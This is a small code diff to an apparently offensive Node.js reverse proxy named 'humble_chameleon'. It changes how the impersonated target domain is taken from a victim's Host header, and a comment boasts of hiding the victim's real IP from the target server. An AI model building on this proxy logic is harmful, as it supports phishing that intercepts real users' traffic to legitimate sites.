@@ -61,7 +61,12 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   //get some target configs to set up a request to the real site
   requested_domain = victim_request.headers.host
   split_domain = requested_domain.split('.')
-  humble_domain = split_domain.slice(-2).join('.')
+  split_domain.shift()
+  if(split_domain.length == 1){
+    humble_domain = requested_domain
+  }else{
+    humble_domain = split_domain.join('.')
+  }
 
   //set our own attribute to track actual IP and remove the extra header so the target server can't see it ;)
   victim_request.x_real_ip = victim_request.headers['x-real-ip']
